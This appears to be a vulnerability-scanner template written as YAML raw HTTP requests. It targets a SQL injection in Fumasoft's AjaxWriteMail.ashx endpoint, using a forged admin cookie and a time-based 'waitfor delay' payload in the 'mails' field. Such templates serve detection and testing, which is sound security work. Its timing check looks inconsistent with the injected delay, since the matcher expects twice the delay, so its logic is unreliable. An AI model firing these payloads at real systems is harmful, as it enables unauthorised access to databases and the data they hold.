id: poc-yaml-fumasoft-ajaxwritemail-ashx-sqli
info:
  name: Fumasoft AjaxWriteMail.ashx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Vulnerability in Fumasoft AjaxWriteMail.ashx endpoint allows SQL Injection, leading to potential data breaches.

variables:
  t1: "{{rand_int(1, 5)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: UserCookie={"empId":"admin","corpId":"1"}

        method=updateLastedContactTable&mails=1'waitfor+delay'0:0:{{t1}}'--+
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
      - type: dsl
        dsl:
          - "duration > to_number(t2)"
          - "duration < to_number(t3)"
  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: UserCookie={"empId":"admin","corpId":"1"}

        method=test
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "未将对象引用设置到对象的实例"
        part: body
